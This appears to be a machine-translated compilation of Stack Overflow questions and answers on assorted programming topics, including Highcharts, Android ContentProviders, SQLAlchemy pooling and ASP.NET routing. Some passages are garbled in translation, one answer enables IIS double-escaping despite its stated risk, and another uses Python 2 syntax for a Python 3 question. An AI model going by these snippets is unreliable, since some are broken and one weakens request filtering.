但回想起来，我也可以做的是访问视图控制器的当前实例，该实例也恰好是根视图控制器，使用：

```
UIViewController *controller = self.window.rootViewController; 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2014-01-09T11:30:48.157

应用程序委托中调用的响应最好不要调用任何特定的视图控制器，最好使用以下之一来修改数据-

1.积木

2.NSUserDefaults 或 CoreData 数据库

3.通知

4.Shared Singleton 实例

# javascript - 在 Highcharts JS 中自动加入缺失的数据间隙

> ID：15973457
> 
> 赞同：8
> 
> 时间：2013-04-12T14:06:09.153
> 
> 标签：javascript, highcharts, missing-data

我目前正在寻找在我的应用程序中实现[Highcharts JS](http://www.highcharts.com/)，使用月份作为 x 轴类别。

但是，我的数据中存在差距，并希望图表能够自动连接这些差距。

例如，如果我没有 3 月的任何数据，我希望 2 月和 4 月用一条直线连接。

使用 highcharts 演示，我编辑了数据以演示默认情况下当前发生的情况：

[http://jsfiddle.net/kf26t/1/](http://jsfiddle.net/kf26t/1/)

```
data: [7.0, 10.0, null, 14.5, 18.2, 21.5, 25.2, 26.5, 23.3, 18.3, 13.9, 9.6] 
```

如您所见，2 月和 4 月之间的分界线有所中断。

我已经考虑从类别中删除没有数据的月份，但这将产生一个偏斜的结果，因为 2 月和 4 月将与 4 月和 5 月相距相等，这不会给出准确的表示。

如果我要删除 4 个月，则这种不准确的表示被夸大了：

[http://jsfiddle.net/kf26t/2/](http://jsfiddle.net/kf26t/2/)

```
categories: ['Jan', 'Feb', 
                    'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec'] 
```

我能想到的唯一解决方案是计算月份之间的平均值，但我不希望显示平均值。

Highchart JS 中是否有任何内置方法可以填补这些空白？如果没有，是否有更简洁的解决方案来解决我的建议？

* * *

或者，有没有一种方法可以根据值分离 x 轴？所以如果没有三月的月份，二月和四月就出现了2个月的距离。

当整数是 x 轴时，这也很有用。例如，如果我有“1、2、10”，我不希望这些均匀分布。

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2013-04-12T15:53:46.703

我可能遗漏了一些东西，但是通过您的示例和解释，您似乎正在寻找 connectNulls 属性：

[http://api.highcharts.com/highcharts#plotOptions.series.connectNulls](http://api.highcharts.com/highcharts#plotOptions.series.connectNulls)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-12T14:20:43.017

对于这种行为，应使用[**Highstocks JS而不是 Highcharts JS。**](http://www.highcharts.com/stock/demo/)

```
data: [
       [Date.UTC(2013,  0, 1), 1],
       [Date.UTC(2013, 1, 1), 2 ],
       [Date.UTC(2013, 3,  1), 4],
       [Date.UTC(2013, 4,  1), 5 ],
       [Date.UTC(2013, 5, 1), 6 ],
       [Date.UTC(2013, 6, 1), 7],
       [Date.UTC(2013,  7,  1), 8],
       [Date.UTC(2013,  8,  1),9],
       [Date.UTC(2013, 9, 1), 10],
       [Date.UTC(2013, 10, 1), 11],
       [Date.UTC(2013, 11, 1), 12]
      ] 
```

***现场演示：http:** [//jsfiddle.net/q2kSf/](http://jsfiddle.net/q2kSf/)*

# asp.net - 如何在 iFrame 中打开 aspx 表单

> ID：15973460
> 
> 赞同：1
> 
> 时间：2013-04-12T14:06:13.727
> 
> 标签：asp.net, iframe, webforms

我需要在 iframe 中打开一个 aspx 表单，所以我需要一个直接链接来使用

但问题是，我试图在 iframe 中打开的表单位于 aspx 页面上，当我在 iframe 中输入该页面的 url 时，我会在 iframe 中获得整个页面，但我只需要表单。

现在我的问题是如何仅通过源代码获取表单的特定 url <==

无论如何都可以将页面的一个特定部分导入iframe吗？

提前谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-16T18:34:45.613

由于带有表单的页面来自您无法控制的另一个网站，因此您无能为力。[同源策略](http://en.wikipedia.org/wiki/Same_origin_policy)禁止您与 iframe 中的页面进行交互。

有一些技术可以让您绕过相同的源策略（CORS、postMessage），但都需要在目标页面上启用某种级别的访问权限。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-12T14:57:19.313

将您的表单转换为 UserControl（如果还没有）并将其放到一个没有页眉/页脚/导航的新空白页面上，然后将这个新页面的 URL 加载到您的 iframe 中。

# android - 如何创建其他应用程序（Polaris Office）只能读取的文件？

> ID：15973471
> 
> 赞同：1
> 
> 时间：2013-04-12T14:06:38.493
> 
> 标签：android, android-intent, android-sdcard, android-file, android-permissions

这是我在我的应用程序中尝试做的事情。我下载文件（docx、pptx、pdf、mov 等）并将它们存储在`File`. 下载文件后，我希望用户能够打开并阅读它。**我不希望用户能够修改`File`**！

这是我尝试实现这一目标的方法。

```
 String uri =   nameFileStatic + extension;
            RestClientGetAsFile client = new RestClientGetAsFile(url, getActivity(), uri) {
                @Override
                protected void onPostExecute(File results) {
                    if (results != null) {
                        if (results.exists()) {
                            Uri path = Uri.fromFile(results);
                            Intent intent = new Intent(Intent.ACTION_VIEW);
                            intent.setDataAndType(path, type); //type
                            intent.setFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);
                            try {
                                startActivity(intent);
                            } catch (ActivityNotFoundException e) {
                                Toast.makeText(DescriberAttachments.this.getActivity(),
                                        "No Application Available to View file with extension " + extension, Toast.LENGTH_SHORT).show();
                            }
                        }
                    }
                }
            };
            client.execute(); 
```

基本上，我在 AsyncTask 实例中下载文件。然后在`onPostExecute()`方法中，我使用 Intent 打开文件。

现在的问题是：在哪里存储文件？这是我尝试过的：

*   乌里= `getDir("SLIMS", Context.MODE_WORLD_READABLE ).getAbsolutePath() + "/Attachments/myfile.docx"`。在保存文件之前，我总是确保目录存在。

> ```
> File directoryMain = new File(getDir("SLIMS", Context.MODE_PRIVATE).getAbsolutePath());
> directoryMain.mkdir();
> File directoryAttachments = new File( getDir("SLIMS",  Context.MODE_PRIVATE).getAbsolutePath() + "/Attachments");
> directoryAttachments.mkdir(); 
> ```

不幸的是，之后我无法打开文件...我收到一条消息错误（来自 Polaris Office），但在我的日志中找不到任何相关消息。

*   uri =`getFilesDir() + "/Attachments/myfile.docx".`我得到了与前一点相同的错误。

*   乌里= `Environment.getExternalStorageDirectory() + "/Attachments/myfile.docx"`。这次我可以在 Polaris Office 中打开文件，但我无法将其`File`设为只读。我试过了`myFile.setReadOnly()`，`myFile.setReadable(true)`但`myFile.setWritable(false)`最后我仍然能够修改文件。

所以我想现在我仍然会将这些文件存储在 sdcard 中，但我真的对写权限感到恼火。

有什么建议吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-12T14:11:05.110

在您的应用程序内部创建一个[`ContentProvider`](http://developer.android.com/guide/topics/providers/content-providers.html)并使用对内容方案的引用启动查看器应用程序，例如`content://com.mydomain.myapp/file/filename.jpg`.

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-16T13:59:45.667

正如[323go](https://stackoverflow.com/a/15973577/1685143)建议的那样，我实现了一个 ContentProvider。我的代码来自[CommonsWare 的帖子](https://stackoverflow.com/a/6535817/1685143)。

这是我下载文件的代码。下载文件后，我将其保存为“ComingFromSLIMSDatabase”+ 扩展名。扩展名可以是 docx、pptx、pdf 等。下载我的文件后，我会调用带有隐式 Intent 的 Activity 并提供内容提供者的 uri。

```
String uri = nameFileStatic + extension;
            RestClientGetAsFile client = new RestClientGetAsFile(url, getActivity(), uri) {
                @Override
                protected void onPostExecute(File results) {
                    if (results != null) {
                        if (results.exists()) {
                            results.setReadable(true);
                            try {
                                startActivity(new Intent(Intent.ACTION_VIEW, Uri.parse(AttachmentProvider.CONTENT_URI
                                        + "ComingFromSLIMSDatabase" + extension)));
                            } catch (ActivityNotFoundException e) {
                                Toast.makeText(DescriberAttachments.this.getActivity(),
                                        "No Application Available to View file with extension " + extension, Toast.LENGTH_SHORT).show();
                            }
                        }
                    }
                }
            };
            client.execute(); 
```

然后 ContentProvider 接听电话并打开我要显示的文件。

```
public class FileProvider extends ContentProvider {
  public static final Uri CONTENT_URI=Uri.parse("content://com.commonsware.android.cp.files/");
  private static final HashMap<String, String> MIME_TYPES=new HashMap<String, String>();

  static {
    MIME_TYPES.put(".pdf", "application/pdf");
  }

  @Override
  public boolean onCreate() {
    File f=new File(getContext().getFilesDir(), "test.pdf");

    if (!f.exists()) {
      AssetManager assets=getContext().getResources().getAssets();

      try {
        copy(assets.open("test.pdf"), f);
      }
      catch (IOException e) {
        Log.e("FileProvider", "Exception copying from assets", e);

        return(false);
      }
    }

    return(true);
  }

  @Override
  public String getType(Uri uri) {
    String path=uri.toString();

    for (String extension : MIME_TYPES.keySet()) {
      if (path.endsWith(extension)) {
        return(MIME_TYPES.get(extension));
      }
    }

    return(null);
  }

  @Override
  public ParcelFileDescriptor openFile(Uri uri, String mode)
    throws FileNotFoundException {
    String path = uri.getPath();
    File f=new File(getContext().getFilesDir(),path);
    if (f.exists()) {
      return(ParcelFileDescriptor.open(f,
                                        ParcelFileDescriptor.MODE_READ_ONLY));
    }

    throw new FileNotFoundException(uri.getPath());  
  }

  @Override
  public Cursor query(Uri url, String[] projection, String selection,
                        String[] selectionArgs, String sort) {
    throw new RuntimeException("Operation not supported");
  }

  @Override
  public Uri insert(Uri uri, ContentValues initialValues) {
    throw new RuntimeException("Operation not supported");
  }

  @Override
  public int update(Uri uri, ContentValues values, String where, String[] whereArgs) {
    throw new RuntimeException("Operation not supported");
  }

  @Override
  public int delete(Uri uri, String where, String[] whereArgs) {
    throw new RuntimeException("Operation not supported");
  }

  static private void copy(InputStream in, File dst) throws IOException {
    FileOutputStream out=new FileOutputStream(dst);
    byte[] buf=new byte[1024];
    int len;

    while((len=in.read(buf))>0) {
      out.write(buf, 0, len);
    }

    in.close();
    out.close();
  }
} 
```

使用此方法，即使文件存储在 Context.getFilesDir() 中，用户也可以打开文件。现在我仍然很困惑。因为如果我打开一个 doc 文件，我仍然可以修改它并将其保存在其他地方。目前这不是一个理想的功能。

我想知道是否有人知道**在不让另一个应用程序将其保存在其他地方的情况下查看文件内容的方法**。

# c++ - 如何使用 Xcode 在 C++ 项目中添加静态库

> ID：15973472
> 
> 赞同：16
> 
> 时间：2013-04-12T14:06:41.023
> 
> 标签：c++, xcode, static-libraries, static-linking

我正在使用**Xcode**作为 IDE开发一个**C++项目。**现在，我想添加一个静态库和相关的 header 。 **`4.6.1``mylib.a``mylib.h`**

 **我阅读了有关**[此解决方案](https://stackoverflow.com/questions/6124523/linking-a-static-library-to-an-ios-project-in-xcode-4)**的信息，但它不起作用（单击*Target Dependencies*时，该框仍为空）。

有没有办法完成这个任务？

* * *

## 更新：

我创建了一个*group*，然后我`mylib.a`在上面添加了文件。它似乎工作正常，但在编译时出现如下警告：

```
ld: warning: ignoring file /Users/vdenotaris/Desktop/Code/MyStaticLib/mylib.a, file was built for archive which is not the architecture being linked
(i386):/Users/vdenotaris/Desktop/Code/MyStaticLib/mylib.a 
```

* * *

## 回答 #1

> 赞同：17
> 
> 时间：2013-04-12T14:30:17.900

如果您的静态库是由另一个*XCode*项目创建的并且您想要包含该项目，则使用目标依赖项，以便您可以轻松地在您的库和相应的应用程序上进行开发。

如果您想包含一个外部库，您可以在**TARGETS**下选择您的目标，然后选择**Build Phases**部分，您可以将区域**Link Binary With Libraries**添加到该区域，您可以通过*拖放*或`+`符号添加您的库。

要添加包含路径，您在**PROJECT**下选择您的项目，您选择在*Search Path下的***Build Settings**区域，Points **Header Search Paths**这应该包括标题所在目录的路径。

 ****Project*或*Targets*中的设置之间的区别在于，在*Project*中它为所有目标设置默认设置。在*Targets*中，您可以更改每个*Target*的设置。

**编辑** 对于链接错误，这两个答案可能会有所帮助：

*   [Xcode 4 中的静态库](https://stackoverflow.com/questions/14458390/static-library-in-xcode-4)
*   [文件是为存档而构建的，它不是被链接的体系结构（i386）](https://stackoverflow.com/questions/10803211/file-was-built-for-archive-which-is-not-the-architecture-being-linked-i386)*****

# java - 如何从具有循环关系的数据集中形成一棵树？

> ID：15973475
> 
> 赞同：0
> 
> 时间：2013-04-12T14:06:52.887
> 
> 标签：java, tree, cyclic-reference

我有这样的课：

```
class Foo {
    public String name = "";
    public ArrayList<Foo> children = new ArrayList<Foo>();
} 
```

现在，我在 ArrayList 中存储了大约两千个这样的“Foo”对象，从上面的代码片段可以看出，它们彼此相关。现在，这些关系可能是循环的：A 可能有一个孩子 B，可能有孩子 C，可能有孩子 A。我想要做的是打印出这些关系的树，同时忽略循环关系，如下所示：

```
ObjA
  ObjB
    ObjC
ObjD
  ObjB
    ObjA 
```

我怎样才能做到这一点？它不必很快或任何东西，这棵树主要是为了确保我的程序的结果。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-12T14:14:51.417

`Foo`需要一个`print`打印其内容的方法，然后调用它指向 的`print`方法。接受一个包含所有已遍历对象的[HashSet 。](http://docs.oracle.com/javase/6/docs/api/java/util/HashSet.html)如果是，那么它是循环的一部分，你不调用它的方法。`Foo``Print``Foo``next``visited``print`

```
class Foo {
    Foo next;
    void print(HashSet<Foo> visited) {
        System.out.println("this Foo's ID or whatever it is you're printing");
        visited.add(this);
        if(next != null && !visited.contains(next)) {
            next.print(visited);
        }
    }
} 
```

您可能还想传入一个`int`确定缩进级别的参数 - 如果`indent`等于 4，则在 之前打印 4 个空格，并在调用时`System.out.println`增加`indent`2 或 4 或其他任何值。`print``next`

# python-3.x - 试图制作一个计算数字的列表

> ID：15973477
> 
> 赞同：0
> 
> 时间：2013-04-12T14:06:57.407
> 
> 标签：python-3.x

我正在尝试编写一个函数，该函数创建一个包含 100 个零的列表，然后生成 0 到 100 之间的 1000 个随机整数，然后计算每个数字生成的次数，然后在原始列表中返回这些值，让一些 0 出现 2 次和 1 出现 5 次列表的开头将是 [2,5...]

我尝试了一些东西，但这并没有真正起作用我的意思是我知道我需要在某个地方放入一些索引的东西，但我不确定下一步该去哪里。

```
from random import*

def f():
    b=[0]*100
    x=1000
    while x>0:
        for x in b:
            b[x]=randrange(0,101)
        x-=1
    return(b)

print(f()) 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-12T14:11:04.530

```
from random import*

def f():
    b=[0]*101
    for i in range(0, 1000):
        b[randrange(0,101)]+=1
    return b

print f() 
```

# jquery - jQuery将两个不同的数字相加并相减

> ID：15973478
> 
> 赞同：0
> 
> 时间：2013-04-12T14:06:58.657
> 
> 标签：jquery, html, forms

我能问一下如何攻击这个功能（总分 - 标准分）。但这很棘手，因为如果一个洞还没有打完，则不应从当前得分中减去标准杆。到目前为止，这是我对隐藏字段的尝试：

```
$("#scorecard").change(function() {
    var totalscore = 0;
    $("#scorecard input:hidden").each(

    function() {
        totalscore += parseInt($(this).val())
    });
    $("#score").val(totalscore * -1);
}).change(); 
```

[http://jsfiddle.net/hireconor/DDfbf/11/](http://jsfiddle.net/hireconor/DDfbf/11/)

# javascript - Angularjs 未正确绑定到空数组

> ID：15973479
> 
> 赞同：1
> 
> 时间：2013-04-12T14:06:59.770
> 
> 标签：javascript, angularjs

我正在编写一个小型 Angular 应用程序来调查它是否值得在未来使用，到目前为止，我真的很享受它的开发多么容易。

然而，我遇到了障碍。我有两个数据模型，一个工厂列表和一个工厂产品列表。

当从列表中添加或删除新工厂时计算产品，并且在大多数情况下，这可以正常工作，直到您从列表中删除最后一个工厂。我希望产品绑定到的表像工厂列表一样清空，因为它的底层数组变为空，但最后一项保留。

我没有显示此内容的小提琴，但我已将应用程序上传到此处的 azure 站点[，](http://complexity.azurewebsites.net/#/complex)并且代码在[此处](https://github.com/Dramak/Complexity)的 git 上，关键文件是 app/view/complex 和 app/scripts/Complex.js

您可以提供的任何帮助将不胜感激

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-12T14:21:49.923

问题似乎在这里：

```
angular.extend(this.complexProduct, itemsProduced); 
```

您不应该使用数组扩展数组。扩展用于对象。使用空数组扩展数组的结果将最终只返回原始数组。

```
var x = [1, 2, 3];
angular.extend(x, []);
console.log(x); //1, 2, 3 
```

尝试这个：

```
$scope.complexProduct = itemsProduced; 
```

（我更喜欢 $scope ，因为它更具体，而且 IMO 更容易理解）

# python - SQLAlchemy：pool_size 和 SQLite

> ID：15973481
> 
> 赞同：5
> 
> 时间：2013-04-12T14:07:03.020
> 
> 标签：python, orm, sqlalchemy

编码

`create_engine(sqlite:////infodb/timestamp.db', pool_size=10)`

在 SQLAlchemy 0.6.3 版中工作正常。但是，它在 0.7.1 版本中不起作用。

我得到的错误信息如下

> 类型错误：使用配置 SQLiteDialect_pysqlite/NullPool/Engine 将无效参数“pool_size”发送到 create_engine()。请检查关键字参数是否适合这种组件组合。

在 0.7.1 版本中，`poolclass`变量的默认值是`sqlalchemy.pool.NullPool`. 反过来，该`NullPool`对象不接受`pool_size`变量。在 0.6.3 版本中，`poolclass`是 的一个实例，`sqlalchemy.pool.SingletonThreadPool`因此处理`pool_size`.

因此，SQLAlchemy 0.7.1 版本**不向后兼容**0.6.3。`SingletonThreadPool`所以我想知道，从to去的原因是什么`NullPool`？它破坏了用户的代码。

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2013-04-12T14:19:15.267

来自[SQLAlchemy 0.7 What's New 文档](http://docs.sqlalchemy.org/en/rel_0_7/changelog/migration_07.html#sqlite-the-sqlite-dialect-now-uses-nullpool-for-file-based-databases)：

> ### SQLite - SQLite 方言现在`NullPool`用于基于文件的数据库
> 
> 此更改为**99.999% 向后兼容**，除非您跨连接池连接使用临时表。
> 
> 基于文件的 SQLite 连接非常快，并且 using`NullPool`意味着每次调用`Engine.connect`都会创建一个新的 pysqlite 连接。
> 
> 以前，`SingletonThreadPool`使用了 ，这意味着线程中到某个引擎的所有连接都是同一个连接。新方法旨在更直观，尤其是在使用多个连接时。
> 
> `SingletonThreadPool``:memory:`使用数据库时仍然是默认引擎。
> 
> 请注意，由于 SQLite 处理临时表的方式，此更改**会破坏跨 Session commits 使用的临时表。**如果需要超出一个池连接范围的临时表，请参阅[http://www.sqlalchemy.org/docs/dialects/sqlite.html#using-temporary-tables-with-sqlite](http://www.sqlalchemy.org/docs/dialects/sqlite.html#using-temporary-tables-with-sqlite)上的注释。
> 
> [#1921](http://www.sqlalchemy.org/trac/ticket/1921)

迄今为止，主要的 SQLAlchemy 版本（介于 0.5 和 0.6 或 0.6 到 0.7 之间）始终包含向后不兼容的更改，因为正在制定主要想法。0.7 也不例外，请参阅[Backwards Incompatible API Changes 部分](http://docs.sqlalchemy.org/en/rel_0_7/changelog/migration_07.html#backwards-incompatible-api-changes)。

如果必须，您仍然可以通过`poolclass`在调用中传递关键字来提供不同的池类`connect`：

```
from sqlalchemy.pool import SingletonThreadPool

engine = create_engine('sqlite:///mydb.db', poolclass=SingletonThreadPool) 
```

传入显式池类也适用于 0.6。就个人而言，我会在这里使用异常处理：

```
try:
    engine = create_engine(URL, pool_size=10)
except TypeError:
    # The pool_size argument won't work for the default SQLite setup in SQLAlchemy 0.7, try without
    engine = create_engine(URL) 
```

# c# - URL 路由仅适用于 localhost

> ID：15973485
> 
> 赞同：0
> 
> 时间：2013-04-12T14:07:19.347
> 
> 标签：c#, asp.net, url-routing

我正在使用 URL 路由，我的 URL 像这样在本地工作；

```
http://localhost:1545/ActivateUser/speu2mzi+TcVsO3NCQZtWAFX2lWecxotSfAOXu/1TEQ= 
```

但它不适用于另一台主机。

```
http://demo.callcenter.com/ActivateUser/speu2mzi+TcVsO3NCQZtWAFX2lWecxotSfAOXu/1TEQ= 
```

我的`global.asax`文件：

```
RouteTable.Routes.MapPageRoute("ActivateUser", "ActivateUser/{*code}", "~/Presentation/Site/ActivateUser.aspx"); 
```

有谁知道问题是什么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-12T14:17:02.627

从[IIS 7 中的 404 错误在路径中使用带有加号 (+) 的 Url](http://www.ifinity.com.au/Blog/EntryId/60/404-Error-in-IIS-7-when-using-a-Url-with-a-plus-sign-in-the-path)

> 1) 需要在 URL 路径中使用“+”字符的应用程序可以通过在应用程序的 web.config 中的 system.webServer/security/requestFiltering 配置部分中设置 allowDoubleEscaping 属性来禁用此验证。但是，这可能会使您的应用程序更容易受到恶意 URL 的攻击：

```
<system.webServer>
    <security>
            <requestFiltering allowDoubleEscaping="true" />
    </security>
</system.webServer> 
```

# android - 图像根据宽度和高度在 imagebutton 中拉伸

> ID：15973486
> 
> 赞同：2
> 
> 时间：2013-04-12T14:07:21.503
> 
> 标签：android, android-layout

这个 ImageButton 是可点击的。我需要在不拉伸的情况下在中心显示这个图标。有没有办法添加宽度和高度或属性？请给我一个想法。谢谢

```
<ImageButton
    android:layout_width="60dp"
    android:layout_height="wrap_content"
    android:background="@drawable/usercalltab"/> 
```

用户调用表.xml

```
<?xml version="1.0" encoding="utf-8"?>
<selector xmlns:android="http://schemas.android.com/apk/res/android">
    <item android:state_pressed="true">
        <layer-list xmlns:android="http://schemas.android.com/apk/res/android" >
            <item>
                <shape android:shape="rectangle" >
                    <solid android:color="#ffdbab" />
                </shape>
            </item>
            <item>
                 <bitmap android:src="@drawable/search"/>
            </item>
        </layer-list>
    </item>
    <item>
        <layer-list xmlns:android="http://schemas.android.com/apk/res/android" >
            <item>
                 <bitmap android:src="@drawable/callme"/>
            </item>
        </layer-list>
        </item>
</selector> 
```

![在此处输入图像描述](https://i.stack.imgur.com/o49tt.png)

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-12T14:13:58.480

试试这样：

```
<ImageButton
android:layout_width="60dp"
android:layout_height="wrap_content"
android:src="@drawable/usercalltab"
android:scaleType="centerInside"
/> 
```

或者可能`android:scaleType="center"`

其中之一应该是你正在寻找的我认为

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-12T14:30:12.250

我认为你应该把它分成背景和前景图像。它更清洁且可重复使用。

如果你想在不这样做的情况下实现它，你可以试试这个：

```
<?xml version="1.0" encoding="utf-8"?>
<selector xmlns:android="http://schemas.android.com/apk/res/android">
    <item android:state_pressed="true">
        <layer-list>
            <item>
                <shape android:shape="rectangle">
                    <solid android:color="#ffdbab" />
                </shape>
            </item>
            <item>
                 <bitmap android:src="@drawable/search" android:gravity="center" />
            </item>
        </layer-list>
    </item>
    <item>
        <layer-list>
            <item>
                <shape android:shape="rectangle">
                    <solid android:color="@android:color/transparent" />
                </shape>
            </item>
            <item>
                 <bitmap android:src="@drawable/callme" android:gravity="center" />
            </item>
        </layer-list>
    </item>
</selector> 
```

# ruby-on-rails - time_zone_options_for_select 添加默认值和优先级

> ID：15973491
> 
> 赞同：0
> 
> 时间：2013-04-12T14:07:42.247
> 
> 标签：ruby-on-rails, ruby-on-rails-3, timezone

我有这段代码，我不知道如何设置选定的选项，或者如何设置时区的优先级

```
%select{id: "timezone", class: "select", name: "school[time_zone]"}
  = time_zone_options_for_select 
```

time_zone_options_for_select 返回一个 html 字符串，我不知道如何使用它：-？

任何帮助真的很感激！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-12T14:34:02.490

您可以参考[http://apidock.com/rails/ActionView/Helpers/FormOptionsHelper/time_zone_options_for_select](http://apidock.com/rails/ActionView/Helpers/FormOptionsHelper/time_zone_options_for_select)。

根据此 url，它将为您提供一系列选项，您需要将其包装在 select 标记中。

```
time_zone_options_for_select('American Samoa') 
```

将“美属萨摩亚”设为选定值。您可以将所需的时区名称作为第一个参数传递给此辅助方法，以将其显示为选定值。

# java - 无法从 Nvidia Tegra Developer Pack 在 Eclipse 中导入 org.opencv[...]

> ID：15973493
> 
> 赞同：1
> 
> 时间：2013-04-12T14:07:56.917
> 
> 标签：java, eclipse, opencv, import, tegra

我已经下载了[https://developer.nvidia.com/tegra-android-development-pack](https://developer.nvidia.com/tegra-android-development-pack)，其中包含 OpenCV for Tegra 2.4.3.2。**如何将 opencV 导入项目。**

我已经安装了它，然后运行 ​​Eclipse 并导入 opencv 示例，但后来我得到了很多，我无法修复它

`The import org.opencv.imgproc cannot be resolved`

而且我不知道我应该在项目中添加什么以使其工作。目录中没有jar。**这些是来自 Nvidia 包的真实样本，因此它们应该可以工作。**

控制台输出：

```
16:00:48 **** Auto Build of configuration Default for project OpenCV Tutorial 4 - Mix Java+Native OpenCV ****
"D:\\Programowanie\\EclipseTegra\\cygwin\\bin\\bash" "D:\\Programowanie\\EclipseTegra\\android-ndk-r8d/ndk-build" NDK_DEBUG=1 V=1 
cygwin warning:
  MS-DOS style path detected: D:\Programowanie\EclipseTegra\OpenCV-2.4.3.2-android-sdk-tadp\samples\tutorial-4-mixed
  Preferred POSIX equivalent is: /cygdrive/d/Programowanie/EclipseTegra/OpenCV-2.4.3.2-android-sdk-tadp/samples/tutorial-4-mixed
  CYGWIN environment variable option "nodosfilewarning" turns off this warning.
  Consult the user's guide for more details about POSIX paths:
    http://cygwin.com/cygwin-ug-net/using.html#using-pathnames
rm -f ./libs/armeabi/lib*.so ./libs/armeabi-v7a/lib*.so ./libs/mips/lib*.so ./libs/x86/lib*.so
rm -f ./libs/armeabi/gdbserver ./libs/armeabi-v7a/gdbserver ./libs/mips/gdbserver ./libs/x86/gdbserver
rm -f ./libs/armeabi/gdb.setup ./libs/armeabi-v7a/gdb.setup ./libs/mips/gdb.setup ./libs/x86/gdb.setup
Gdbserver      : [arm-linux-androideabi-4.6] libs/armeabi-v7a/gdbserver
install -p /cygdrive/d/Programowanie/EclipseTegra/android-ndk-r8d/prebuilt/android-arm/gdbserver/gdbserver ./libs/armeabi-v7a/gdbserver
Gdbsetup       : libs/armeabi-v7a/gdb.setup
echo "set solib-search-path ./obj/local/armeabi-v7a" > ./libs/armeabi-v7a/gdb.setup
echo "directory D:/Programowanie/EclipseTegra/android-ndk-r8d/platforms/android-9/arch-arm/usr/include D:/Programowanie/EclipseTegra/android-ndk-r8d/sources/cxx-stl/gnu-libstdc++ "../../sdk/native/jni/include/opencv" "../../sdk/native/jni/include" D:/Programowanie/EclipseTegra/android-ndk-r8d/sources/cxx-stl/gnu-libstdc++/4.6/include D:/Programowanie/EclipseTegra/android-ndk-r8d/sources/cxx-stl/gnu-libstdc++/4.6/libs/armeabi-v7a/include" >> ./libs/armeabi-v7a/gdb.setup
Install        : libmixed_sample.so => libs/armeabi-v7a/libmixed_sample.so
install -p ./obj/local/armeabi-v7a/libmixed_sample.so ./libs/armeabi-v7a/libmixed_sample.so
/cygdrive/d/Programowanie/EclipseTegra/android-ndk-r8d/toolchains/arm-linux-androideabi-4.6/prebuilt/windows/bin/arm-linux-androideabi-strip --strip-unneeded ./libs/armeabi-v7a/libmixed_sample.so

16:00:51 Build Finished (took 2s.621ms) 
```

蚀

![在此处输入图像描述](https://i.stack.imgur.com/4LIQ3.png)

主目录 ![在此处输入图像描述](https://i.stack.imgur.com/0d6xX.png)

opencv目录

![在此处输入图像描述](https://i.stack.imgur.com/NDYKJ.png)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2015-01-29T11:29:34.950

[http://www.java2s.com/Code/Jar/o/Downloadopencv241jar.htm](http://www.java2s.com/Code/Jar/o/Downloadopencv241jar.htm)

下载jar文件并附加到项目然后解决问题

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-09-21T23:29:45.147

试试这个，如此[处所述](http://docs.nvidia.com/gameworks/content/technologies/mobile/opencv_tegra_examples.htm#top)：

1.  打开 Eclipse TADP_directory/eclipse/
2.  在 Package Explorer > Import > General > Existing Projects into Workspace > Next。选择根目录 > 浏览到 TADP_directory/OpenCV-2.4.8.2-Tegra-sdk > 打开。
3.  选择 OpenCV 库 > 完成。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2014-11-09T13:14:40.123

从您的工作区中删除您的 OpenCV 库并再次导入，如下所示：

菜单文件 -> 导入 -> 工作区中的现有项目。按浏览按钮并找到 OpenCV4Android SDK (/OpenCV-2.4.8-android-sdk/sdk)

然后：项目 -> 属性 -> Android -> 库 -> 添加选择 OpenCV 库 - 2.4.8。另外，在Library中选择上面的“is library”。

项目 -> 清理 -> 清理所有项目

这对我有用！

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-11-26T17:23:50.263

不知道您是否仍然处于这种困境中，即在打开的 cv 文件夹中查找 jar 文件。好吧，我也面临这种情况，因此而发疯。现在，我找到了一个简单的解决方案。只需在 `opencv>build>java`（最有可能）中找到 jar 文件，或者您可以在 google 上查找 jar 文件，您可以在其中找到可以下载它们的站点，例如..

> [http://www.java2s.com/Code/Jar/o/Downloadopencv241jar.htm](http://www.java2s.com/Code/Jar/o/Downloadopencv241jar.htm)

下载后，你只需在java构建路径中添加这个文件的路径

```
properties>java build path> add external jars 
```

瞧！:D 这解决了我的导入错误。希望它也适用于您或任何可能面临此问题的人:)

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2014-10-15T07:05:13.263

适用于 Android 的 OpenCV sdk 位于 opencv 目录中的 ./sdk 目录中。

要解决此问题，您应该执行以下步骤：

1.  在工作区中使用菜单文件 -> 导入 -> 现有项目。按浏览按钮并找到 OpenCV4Android SDK（例如 OpenCV-2.4.8-android-sdk/sdk）。不要复制到你的工作空间，否则你会遇到新的问题。
2.  在应用程序项目中，在 Project -> Properties -> Android -> Library -> Add 中添加对 OpenCV Java SDK 的引用，选择 OpenCV Library - 2.4.8。此外，在库窗口中选择上方的“是库”。

现在它应该被修复。

# jquery - 什么是 JCF 库，我在哪里可以找到有关它的文档？

> ID：15973498
> 
> 赞同：5
> 
> 时间：2013-04-12T14:08:09.017
> 
> 标签：jquery, forms

我继承了一个站点，以前的开发人员使用“JCF”库进行了大量自定义格式和样式。我在网上浏览了一个多小时，找不到关于 JCF 库是什么以及如何使用它的实际文档。我对 JQuery 一点都不陌生——我只是从未听说过这个插件。

有人知道吗？下面的代码示例：

```
jcf = {
// global options
modules: {},
plugins: {},
baseOptions: {
    useNativeDropOnMobileDevices: true,
    unselectableClass:'jcf-unselectable', 
    labelActiveClass:'jcf-label-active',
